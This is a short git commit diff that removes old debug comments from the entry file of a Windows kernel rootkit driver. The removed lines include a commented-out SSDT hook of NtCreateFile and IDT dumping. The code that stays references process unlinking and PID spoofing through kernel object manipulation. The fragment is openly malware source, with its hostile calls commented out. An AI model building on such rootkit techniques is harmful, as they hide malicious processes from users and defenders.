32b01cb1385f499382cc67d62e847118d5f8e682
idchoppers <anonymous344@protonmail.com>
2024-04-16 22:20:26 -0400

    get rid of old debug comments

--- nt_rootkit/driver.c
+++ nt_rootkit/driver.c
@@ -7,8 +7,6 @@
 #include <ntddk.h>
 #include "dkom.h"
 #include "lock_proc.h"
-//#include "idt.h"
-//#include "ssdt.h"
 
 void driver_unload(PDRIVER_OBJECT driver_obj) {
         UNREFERENCED_PARAMETER(driver_obj);
@@ -19,20 +17,9 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT driver_obj, PUNICODE_STRING reg_path) {
 
         driver_obj->DriverUnload = driver_unload;
 
-        //dump_idt();
-
         //proc_unlink(0x492C);
 
         //proc_set_pid(0xB88);
-
-        // TODO SSDT AND IDT OBSELETE!
-        /*
-        NtCreateFilePrototype old_ntcreatefile = NULL;
-
-        old_ntcreatefile = 
-                (NtCreateFilePrototype)hook_ssdt(0x55, (PULONG)NtCreateFile, 
-                        (PULONG)hook_ntcreatefile);
-        */
 
         return STATUS_SUCCESS;
 }
